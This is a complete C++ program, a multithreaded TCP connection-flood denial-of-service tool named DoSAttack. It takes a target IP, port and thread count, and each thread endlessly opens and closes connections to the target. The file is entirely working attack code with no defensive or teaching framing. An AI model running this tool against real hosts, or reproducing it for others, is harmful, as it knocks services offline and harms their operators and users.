#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>

using namespace std;


class DoSAttack{
    private:
        int validate_ip(char* ip_address){
            struct sockaddr_in val;
            int result =  inet_pton(AF_INET, ip_address, &val.sin_addr);

            if (result == 0){
                return -1;
            }
            return 0;
        }
    public:
        int send_attackTCP(char *ip_address, int port){
            if (validate_ip(ip_address) != 0){
                cout << "[!] Invalid IP address\n";
                
                return -1;
            }

            struct sockaddr_in target_address;
            target_address.sin_family = AF_INET;
            target_address.sin_port = htons(port);
            inet_pton(AF_INET, ip_address, &target_address.sin_addr);

            cout << "[+] TCP DoS attack started!\n";
            cout.flush();
    

            while (true){
                int sockfd = socket(AF_INET, SOCK_STREAM, 0);
                if (connect(sockfd, (struct sockaddr*)&target_address, sizeof(target_address)) == -1) {
                    close(sockfd); 
                    continue; 
            }
            close(sockfd);

            }

        }

    
};

int main(int argc, char* argv[]){
    
    if (argc != 4) {
        cout << "Usage: " << argv[0] << " <target_ip> <port> <thread_count>\n";
        return -1;
    }

    DoSAttack DosObj;

    int num_threads = atoi(argv[3]);

    vector<thread> threads;
    for (int i = 0; i < num_threads; ++i) {
        threads.push_back(thread(&DoSAttack::send_attackTCP, &DosObj, argv[1], atoi(argv[2])));
    }

    for (auto& t : threads) {
        t.join();
    }


    return 0;
}
